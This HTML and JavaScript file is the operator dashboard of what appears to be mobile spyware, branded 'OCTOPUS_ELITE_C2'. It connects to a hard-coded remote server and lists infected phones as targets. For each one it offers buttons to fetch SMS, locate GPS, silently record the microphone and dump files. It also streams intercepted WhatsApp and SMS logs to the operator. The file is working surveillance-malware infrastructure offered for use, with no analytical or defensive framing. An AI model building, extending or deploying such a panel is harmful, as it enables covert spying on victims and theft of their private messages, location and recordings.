<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OCTOPUS ELITE | V5.0_STABLE</title>
    <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --neon-red: #ff003c;
            --dark-bg: #030303;
            --terminal-green: #00ff41;
            --toxic-yellow: #f1c40f;
            --wa-cyan: #00f2ff;
            --glass: rgba(255, 255, 255, 0.05);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; cursor: crosshair; }

        body {
            background-color: var(--dark-bg);
            background-image: radial-gradient(circle, #111 1px, transparent 1px);
            background-size: 25px 25px;
            color: #eee;
            font-family: 'Fira Code', monospace;
            height: 100vh;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        /* --- TOP BAR --- */
        header {
            padding: 20px 40px;
            border-bottom: 2px solid #1a1a1a;
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: #000;
        }

        .glitch {
            font-size: 1.5rem;
            font-weight: bold;
            color: #fff;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        #auth-status { font-size: 10px; color: var(--terminal-green); letter-spacing: 1px; }

        /* --- MAIN LAYOUT --- */
        .wrapper {
            display: grid;
            grid-template-columns: 1fr 400px;
            flex-grow: 1;
            overflow: hidden;
        }

        /* --- TARGET GRID --- */
        main { padding: 25px; overflow-y: auto; background: rgba(0,0,0,0.5); }
        
        #target-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
            gap: 20px;
        }

        .card {
            background: #0a0a0a;
            border: 1px solid #222;
            padding: 20px;
            position: relative;
            transition: 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        .card:hover { border-color: var(--neon-red); transform: translateY(-5px); box-shadow: 0 10px 30px rgba(255, 0, 60, 0.1); }

        .card h4 { color: var(--neon-red); margin-bottom: 5px; font-size: 14px; }
        .card small { color: #555; display: block; margin-bottom: 15px; font-size: 10px; }

        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }

        button {
            background: #111;
            border: 1px solid #333;
            color: #ccc;
            padding: 8px;
            font-family: inherit;
            font-size: 10px;
            text-transform: uppercase;
            transition: 0.2s;
        }

        button:hover { background: var(--neon-red); color: #000; border-color: var(--neon-red); font-weight: bold; }
        
        .btn-danger { color: #ff4d4d; border-color: #441111; margin-top: 10px; width: 100%; }
        .btn-danger:hover { background: #ff4d4d; color: #000; }

        /* --- TERMINAL SIDEBAR --- */
        .sidebar {
            background: #000;
            border-left: 1px solid #222;
            display: flex;
            flex-direction: column;
        }

        .sidebar-header { padding: 15px; background: #080808; border-bottom: 1px solid #222; font-size: 12px; color: #888; }

        #terminal {
            padding: 15px;
            font-size: 11px;
            color: var(--terminal-green);
            overflow-y: auto;
            flex-grow: 1;
            line-height: 1.6;
            word-break: break-all;
        }

        #terminal p { margin-bottom: 8px; border-bottom: 1px solid #111; padding-bottom: 4px; }

        /* --- SCROLLBAR --- */
        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-track { background: #000; }
        ::-webkit-scrollbar-thumb { background: #222; }
        ::-webkit-scrollbar-thumb:hover { background: var(--neon-red); }

        /* --- MOBILE ADAPT --- */
        @media (max-width: 1000px) {
            .wrapper { grid-template-columns: 1fr; }
            .sidebar { height: 350px; }
        }
    </style>
</head>
<body>

<header>
    <div>
        <h1 class="glitch">OCTOPUS_ELITE_C2</h1>
        <div id="auth-status">INITIALIZING_SECURE_LINK...</div>
    </div>
    <div style="text-align: right">
        <p id="op-id" style="color: var(--toxic-yellow); font-size: 12px;"></p>
        <p style="font-size: 8px; color: #444;">ENCRYPTION: AES-256-RSA</p>
    </div>
</header>

<div class="wrapper">
    <main>
        <div id="target-grid">
            </div>
    </main>

    <aside class="sidebar">
        <div class="sidebar-header">LIVE_DATA_INTERCEPTOR</div>
        <div id="terminal">
            <p>> Waiting for Mastermind Authentication...</p>
        </div>
    </aside>
</div>

<script>
    // --- AUTHENTICATION LAYER ---
    const operator = prompt("OPERATOR_ID:");
    const accessKey = prompt("ACCESS_KEY:");

    const socket = io("http://51.68.234.157:20211", { 
        query: { 
            type: 'mastermind', 
            user: operator, 
            key: accessKey 
        } 
    });

    const term = document.getElementById('terminal');
    const authStatus = document.getElementById('auth-status');
    const opIdDisplay = document.getElementById('op-id');

    socket.on('connect', () => {
        term.innerHTML += `<p style="color:white;">[LINK] Socket established. Verifying credentials...</p>`;
    });

    socket.on('auth_success', (data) => {
        authStatus.innerText = "LINK_STABLE // ACCESS_GRANTED";
        authStatus.style.color = "var(--terminal-green)";
        opIdDisplay.innerText = "OP_ACTIVE: " + data.user.toUpperCase();
        term.innerHTML += `<p style="color:var(--terminal-green)">[SYSTEM] Welcome, Operator ${data.user}. Secure session started.</p>`;
    });

    socket.on('auth_failed', () => {
        alert("CRITICAL_ERROR: INVALID_CREDENTIALS. DISCONNECTING.");
        window.location.reload();
    });

    // --- TARGET HANDLERS ---
    socket.on('load_targets', (targets) => {
        Object.keys(targets).forEach(id => addTargetCard(id, targets[id]));
    });

    socket.on('update_dashboard', (res) => {
        addTargetCard(res.id, res.data);
    });

    socket.on('target_offline', (id) => {
        const card = document.getElementById(id);
        if(card) card.style.opacity = "0.3";
        term.innerHTML += `<p style="color:red;">[LOST] Target ${id} went offline.</p>`;
    });

    // --- DATA STREAMING ---
    socket.on('display_extra', (res) => {
        const time = new Date().toLocaleTimeString();
        let color = "var(--terminal-green)";
        let tag = res.payload.type.toUpperCase();

        if(tag === 'WA_LOG') color = "var(--wa-cyan)";
        if(tag === 'SMS_LOG') color = "magenta";
        if(tag === 'ERROR') color = "red";

        const logEntry = `
            <p style="color:${color}">
                [${time}] [${tag}] TargetID: ${res.id.substring(0,6)}...<br>
                DATA: ${JSON.stringify(res.payload.data)}
            </p>
        `;
        term.insertAdjacentHTML('afterbegin', logEntry);
    });

    function addTargetCard(id, data) {
        if(document.getElementById(id)) return;
        
        const grid = document.getElementById('target-grid');
        const card = document.createElement('div');
        card.id = id;
        card.className = 'card';
        card.innerHTML = `
            <h4>NODE: ${data.model}</h4>
            <small>UID: ${id}</small>
            <div class="btn-grid">
                <button onclick="sendCmd('${id}','sms')">Fetch SMS</button>
                <button onclick="sendCmd('${id}','gps')">Locate GPS</button>
                <button onclick="sendCmd('${id}','mic')">Silent Rec</button>
                <button onclick="sendCmd('${id}','gallery')">Dump Files</button>
            </div>
            <button class="btn-danger" onclick="sendCmd('${id}','off')">KILL_PROCESS</button>
        `;
        grid.appendChild(card);
    }

    function sendCmd(targetId, action) {
        term.innerHTML = `<p style="color:var(--toxic-yellow)">[CMD] Requesting ${action} on ${targetId}...</p>` + term.innerHTML;
        socket.emit('run_action', { targetId: targetId, action: action });
    }
</script>

</body>
</html>
